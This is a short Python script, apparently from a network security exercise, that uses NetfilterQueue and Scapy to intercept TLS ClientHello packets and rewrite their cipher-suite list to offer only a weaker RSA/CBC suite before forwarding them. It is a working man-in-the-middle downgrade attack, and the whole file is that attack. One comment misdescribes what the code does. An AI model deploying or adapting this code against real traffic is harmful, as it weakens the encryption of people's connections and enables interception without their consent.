#!/usr/bin/python3
from netfilterqueue import NetfilterQueue
from scapy.all import *

nfQueueID         = 0
maxPacketsToStore = 100

def packetReceived(pkt):
  print("Accepted a new packet...")
  
  ip = IP(pkt.get_payload())
  if not ip.haslayer("Raw"):                               # not the Handshake, forward
    pkt.accept();
  else:
    tcpPayload = ip["Raw"].load;                           # "Raw" corresponds to the TCP payload
    if tcpPayload[0] == 0x16 and tcpPayload[1] == 0x03 and tcpPayload[84] == 0xc0 and tcpPayload[85] == 0x2c:
      #print(tcpPayload)
      #print(pkt.get_payload()) 

      print("Packet that should be droped")

      msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it
      msgBytes2 = [b for b in msgBytes]
      a = msgBytes.index(b"\xc0\x2c")

      # change the length of the ciphersuite's list
      msgBytes2[a-8] =  0x00
      msgBytes2[a-7] = 0x02
     
      # this is the relative position which indicates the position of the first element from the list
      msgBytes2[a-5] =  0x2f
      msgBytes2[a-6] = 0x00
      
      pkt.set_payload(bytes(msgBytes2))
      #pkt.drop();
      pkt.accept()                                          # drop TLS_RSA_WITH_AES_256_CBC_SHA
    else:
      pkt.accept();

print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, packetReceived, maxPacketsToStore) # binds to queue 0, use handler "packetReceived()"
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()